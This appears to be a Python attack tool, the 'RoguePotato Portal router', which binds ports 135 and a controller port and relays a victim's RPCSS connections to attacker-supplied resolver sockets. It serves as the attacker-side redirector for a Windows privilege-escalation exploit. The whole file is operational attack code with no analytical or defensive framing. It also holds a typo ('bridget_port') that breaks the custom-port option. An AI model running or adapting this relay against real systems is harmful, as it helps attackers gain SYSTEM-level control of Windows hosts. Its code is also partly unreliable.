import os
import sys
import time
import socket
import argparse
from threading import Thread

RPCSS_PORT = 135
DEFAULT_PORTAL_CONTROL_PORT = 443
ALLOC_RESOLVER_MSG = b'ALLOC\0'

class Portal(Thread):
    def __init__(self, src, dst):
        super(Portal, self).__init__()
        self.src = src
        self.dst = dst

    def run(self):
        try:
            while True:
                data = self.src.recv(4096)
                print('[+][PORTAL] Received {0} bytes. Routing...'.format(len(data)))

                if data:
                    self.dst.sendall(data)
                else:
                    break
        except socket.error as e:
            pass

        finally:
            self.src.close()
            self.dst.close()

def create_bidirectional_portal(rpcss_conn, resolver_conn):
    rpcss_to_resolver = Portal(rpcss_conn, resolver_conn)
    rpcss_to_resolver.start()

    resolver_to_rpcss = Portal(resolver_conn, rpcss_conn)
    resolver_to_rpcss.start()

def get_resolver(controller_sock, controller_conn):
    controller_conn.send(ALLOC_RESOLVER_MSG)
    resolver_conn, resolver_addr = controller_sock.accept()

    return resolver_conn, resolver_addr

def is_conn_closed(conn):
    try:
        data = conn.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
    
        if len(data) == 0:
            return True
    
    except ConnectionResetError:
        return True

    except Exception as e:
        return False

    return False

def controller_monitor(controller_conn):
    while True:
        if is_conn_closed(controller_conn):
            print('[*] Controller disconnected. Exiting...')
            os._exit(0)

        time.sleep(0.5)

def main():
    parser = argparse.ArgumentParser(description='RoguePotato Portal router')
    parser.add_argument('-b', '--bridge-port', help='Portal bridge port to listen')

    args = parser.parse_args()

    portal_port = None
    if args.bridge_port:
        invalid_port_flag = False
        if args.bridge_port.isnumeric():
            portal_port = int(args.bridget_port)
            
            if portal_port < 1 or portal_port > 65535:
                invalid_port_flag = True

            elif portal_port == 135:
                invalid_port_flag = True

        else:
            invalid_port_flag = True

        if invalid_port_flag:
            print('Invalid port number')
            return 1
    else:
        portal_port = DEFAULT_PORTAL_CONTROL_PORT
    
    print('[*] Will listen on ports 135 (mandatory) and {0}'.format(portal_port))
    print('[*] Listening for controller connection...')

    controller_sock = socket.socket()
    controller_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    controller_sock.bind(('0.0.0.0', portal_port))
    controller_sock.listen()
    controller_conn, controller_addr = controller_sock.accept()

    print('[*] Controller connected!')

    monitor_thread = Thread(target=controller_monitor, args=[controller_conn])
    monitor_thread.start()

    rpcss_sock = socket.socket()
    rpcss_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rpcss_sock.bind(('0.0.0.0', RPCSS_PORT))
    rpcss_sock.listen()

    while True:
        print('[*] Waiting for RPCSS connection...')
        rpcss_conn, rpcss_addr = rpcss_sock.accept()

        print('[*] RPCSS connection received. Creating portal...')
        resolver_conn, resolver_addr = get_resolver(controller_sock, controller_conn)
        create_bidirectional_portal(rpcss_conn, resolver_conn)


if __name__ == '__main__':
    try:
        ret = main()

    except KeyboardInterrupt:
        ret = 0

    sys.exit(ret)
